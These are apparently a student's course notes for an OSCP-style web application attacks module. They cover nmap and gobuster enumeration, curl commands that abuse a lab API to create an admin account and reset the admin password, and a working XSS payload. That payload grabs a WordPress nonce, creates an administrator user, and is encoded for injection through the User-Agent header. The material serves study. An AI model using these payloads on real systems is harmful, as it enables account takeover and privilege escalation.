[x] # 8. Introduction to Web Application Attacks
It doesn't get interesting until 8.3.3. Here are some commands for the sections before that.

sudo nmap -p80  -sV 192.168.50.20
sudo nmap -p80 --script=http-enum 192.168.50.20
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5

[x] ## 8.1. Web Application Assessment Methodology
no notes
## 8.2. Web Application Assessment Tools
no notes
[x] ### 8.2.1. Fingerprinting Web Servers with Nmap
sudo nmap -p80  -sV 192.168.50.20

Initial fingerprinting of webserver
sudo nmap -p80 --script=http-enum 192.168.50.20

[x] ### 8.2.2. Technology Stack Identification with Wappalyzer
https://www.wappalyzer.com/

[x] ### 8.2.3. Directory Brute Force with Gobuster
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
-u: Target ip
-w: Wordlist
-t: num threads

[x] ### 8.2.4 Security Testing with Burp Suite
no notes
## 8.3 Web Application Enumeration

[x] ### 8.3.1. Debugging Page Content
Java based web applications might use .jsp, .do or .html

[x] ### 8.3.2. Inspecting HTTP Response Headers and Sitemaps
Http headers that start with X- generally mean non standard. X- headers are depreciated

[x] ### 8.3.3. Enumerating and Abusing APIs
api paths are often followed by versions e.g /api_name/v1

API busting using both a wordlist and pattern combined

step 1) create a file with some patterns called pattern (GOBUSTER essentially acts as FUZZ in other fuzzers)
{GOBUSTER}/v1
{GOBUSTER}/v2

step 2) gobuster
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern

Website.com/ui -> The /ui path has documentation on all apis... usually only available with whitebox testing

curl -i http://192.168.50.16:5002/users/v1
-i: show headers

target admin user for api
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt

attempt to curl password from users api
curl -i http://192.168.50.16:5002/users/v1/admin/password

error 405 = url is present but we need to use another type of http request 

Attempt to convert get request into post request
curl request with parameters wrapped in json (pretty easy {"fieldname":"value","fieldname2":"value2"}
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
-d: Send data in a post request
-H: add header to request

failed Attempt to use register api via curl
curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register

fixed attempt to register now with email as a parameter added. they also guessed that there is an admin parameter that accepts True or False
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register

log in using curl to our created admin account. The response may have a token we can use for further attacks 
curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

Failed attempt Using that token returned to change the admin's account password (failed because the method wasn't allowed)
NOTE: Realize that this exploit is happening within HTTP Headers!
curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'

Fixed attempt using Put method to replace the value instead of creating one
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'

final login to verify exploit
curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

Summary of what they did...
They found APIS by using a fuzzer (enumeration)

They tried using the api with various parameters to further dig into it.
e.g. gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt to target the admin user.
This shows that http://192.168.50.16:5002/users/v1/admin/email and http://192.168.50.16:5002/users/v1/admin/password apis exist.
They noticed that the api responds in JSON so sent all further requests using JSON

They guessed that a login api probably exists (operating under unknowns)
curl -i http://192.168.50.16:5002/users/v1/login

they converted get request to post request

Then they created an admin account to change the actual admin's password

Lab notes: Gobusters progress does not always end at 100%. With the 2 patterns, it endded at 300%. I imagine its for the following:
/:              100% +
/{GOBUSTER}/v1: 100% + 
/{GOBUSTER}/v2: 100%
                = 300%.

I stopped the scan early after 200% and did not find 2 of the API points. Also it does not appear to be sequential order as /users/v1 was one of the last things found

The labs had me look at the following locations to get flags
URL
Source Code of various pages
APIs / fuzzing
source code of css and java script (I wonder what can be gained from inspecting CSS..)
executing javascript

Also Gobuster would act weird if I did not put the correct path to the Api... it would throw up an error like "Error: the server returns a status code that matches the provided options for non existing urls."
I'm not entirely sure of whether I should use this as an indicator that maybe I am putting in the command wrong, or if this was just a one-time thing because there are flags to avoid certain lengths...

### 8.4.1 Stored vs Reflected XSS Theory
Reflected attacks only attack a person submitting a request or visiting a link
DOM attacks can be either reflected or stored
- the key is that DOM-based XSS attacks occur when a browser parses the page's content and inserted JavaScript is executed.
No matter how the XSS payload is delivered and executed, the injected scripts run under the context of the user visiting the affected page. This means that the user's browser, not the web application, executes the XSS payload. (not sure if this is applying only to DOM or Stored attacks as well)

### 8.4.2. JavaScript Refresher
Browsers process Server HTTP responses to create a DOM tree and render it
Dom is the aggregate of forms, inputs, images, on the web page
Java script can access and change DOM
With access to the DOM, we can redirect login forms, extract passwords, and steal session cookies.

Javascript example:
function multiplyValues(x,y) {
  return x * y;
}
 
let a = multiplyValues(3, 5)
console.log(a)

Test javascript code:
go toabout:blank on firefox
then use Web Console (either from menue or Ctrl + Shift + K)

### 8.4.3. Identifying XSS Vulnerabilities
Most common special characters
< > ' " { } ;

The two most common web app encodings are HTML Encodings and URL encodings

When searching for XSS, if the input is being injected into an HTML element, we will need script tags to run javascript. If its going straight to the tag, may just need quotes and semi-colons

### 8.4.4. Basic XSS
They just use burpsuite to inject into the User-Agent a basic alert XSS.... this will not work on any modern browser

### 8.4.5. Privilege Escalation via XSS
cookies track state and information about users

Two flags we are interested in for cookies
Secure and HttpOnly
Secure -- cookie must be sent over encryption
HttpOnly -- deny javascript access to the cookie. (why isn't this the default)

Wordpress admin nonce - server generated token, included in each http request to add randomness and prevent CSRF attacks

CSRF attacks perform actions on behalf of the user
Note: All javascript at https://github.com/Szwochm/OSCP-Prep/blob/main/Scripts/javascript-multi

Javascript Function to get wordpress nonce which is needed to do admin actions:
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

Edit code with Nonce and code to create a user:
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);

Use JS Compress to turn function into a 1- liner. Then encode it.

Run payload through javascript encoder which uses charCodeAt()

Then in injection site run payload through <script> eval(String.fromCharCode(PAYLOAD of a bunch of numbers)
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(PAYLOAD))</script>" --proxy 127.0.0.1:8080
-i: show header information
--user-agent: This happens to be the XSS vulnerable point. will change depending on where and how you are injecting
"<script>eval(String.fromCharCode(PAYLOAD))</script>": You are injecting a javascript that is decoding a payload encoded via charCodeAt()
--proxy 127.0.0.1:8080 -> let burpsuite see the response
<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
Extra Reading   
<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
8.4.5 Privilege Escalation via XSS
https://en.wikipedia.org/wiki/HTTP_cookie
- cookies allow the storage of state (what items are in a shopping cart)
- Http-only cookie -- cannot be accessed by Javascript (xss). Does not prevent XST and CSRF attacks
- Session cookies expire or are deleted when the user closes the web browser -- exists only in temporary memory while the user navigates a website.
- XST attack is basically a XSS attack using the trace method (On IIS, it is TRACK), and can bypass javascript restrictions

https://en.wikipedia.org/wiki/Session_(computer_science)
Sessions are also a basic step in connectionles communication modes

https://en.wikipedia.org/wiki/Secure_cookie
Secure Cookie only helps against confidentiality attacks... attackers can overwrite the cookies from an insecure channel
cookies are inheritantly insecure -- no sensitive information should be stored on them 


https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies
- if an attacker has access to the users client they can still steal cookies secured with secure and httponly headers
- DOM is an api that allows you to view XML and HTML files

https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/
- goes over the wordpress exploit covered in class. I think the course covered it enough.
- .htaccess files or nginx configuration can force http authentication for post requests
	this led me to look into ht access files. https://www.youtube.com/watch?v=vaHG_XhOwKI
	htaccess files let you do a bunch of things such as redirect, ACLs. You can even force iphones to redirect to a mobile site using .htaccess

https://developer.wordpress.org/reference/functions/wp_nonce_field/
how a nonce is used and best practices with a nonce

8.4.5 Privilege Escalation via XSS
https://en.wikipedia.org/wiki/HTTP_cookie
- cookies allow the storage of state (what items are in a shopping cart)
- Http-only cookie -- cannot be accessed by Javascript (xss). Does not prevent XST and CSRF attacks
- Session cookies expire or are deleted when the user closes the web browser -- exists only in temporary memory while the user navigates a website.
- XST attack is basically a XSS attack using the trace method (On IIS, it is TRACK), and can bypass javascript restrictions

https://en.wikipedia.org/wiki/Session_(computer_science)
Sessions are also a basic step in connectionles communication modes

https://en.wikipedia.org/wiki/Secure_cookie
Secure Cookie only helps against confidentiality attacks... attackers can overwrite the cookies from an insecure channel
cookies are inheritantly insecure -- no sensitive information should be stored on them 


https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies
- if an attacker has access to the users client they can still steal cookies secured with secure and httponly headers
- DOM is an api that allows you to view XML and HTML files

https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/
- goes over the wordpress exploit covered in class. I think the course covered it enough.
- .htaccess files or nginx configuration can force http authentication for post requests
	this led me to look into ht access files. https://www.youtube.com/watch?v=vaHG_XhOwKI
	htaccess files let you do a bunch of things such as redirect, ACLs. You can even force iphones to redirect to a mobile site using .htaccess

https://developer.wordpress.org/reference/functions/wp_nonce_field/
how a nonce is used and best practices with a nonce

https://owasp.org/www-community/attacks/csrf
https://jscompress.com/
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/charCodeAt
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

8.4.4. Basic XSS
https://www.exploit-db.com/exploits/49972
https://downloads.wordpress.org/plugin/visitors-app.0.3.zip

8.4.3. Identifying XSS Vulnerabilities
https://en.wikipedia.org/wiki/HTML_element
https://en.wikipedia.org/wiki/Character_encodings_in_HTML#HTML_character_references
https://en.wikipedia.org/wiki/Percent-encoding
	percent encoding is url encoding (but can also be used for URIS and URNS)
	characters in a uri are either reserved or not reserved. Reserved = special character
https://en.wikipedia.org/wiki/Uniform_Resource_Identifier
	If the URI is used to locate and retrieve data from the network, it is a URL (but what about UNC paths?)
	URNs provide a unique name but no means of locating or getting the resource or information on it. (URL has like http:// in it indicating http protocol, etc)
	
	
https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script
	<script> is not limited to javascript.

8.4.2 JavaScript Refresher
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Functions
	no notes
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures
	A good example of how java script handles variables:

	const foo = 42; // foo is a number
	const result = foo + "1"; // JavaScript coerces foo to a string, so it can be concatenated with the other operand
	console.log(result); // 421
	

8.4.1 Stored vs Reflected XSS Theory

https://en.wikipedia.org/wiki/Cross-site_scripting#Persistent_(or_stored)
	no notes

https://en.wikipedia.org/wiki/Cross-site_scripting#Non-persistent_(reflected)
	no notes

https://en.wikipedia.org/wiki/Cross-site_scripting#Server-side_versus_DOM-based_vulnerabilities
	AJAX allows client to pull data on demand from a web server, if it does not have the data presently
	With Ajax, web applications can send and retrieve data from a server asynchronously (in the background) without interfering with the display and behaviour of the existing page

https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction
	dom is a programming interface for web documents
	The DOM represents the document as nodes and objects; that way, programming languages can interact with the page.
	The Dom is using multiple apis to do its job, and it can add more if it needs it
	Dom is not a programming language, but without it web pages would look like the source code
	<script> tags allow you to immediately use api for document (like document to cookie) or window objects


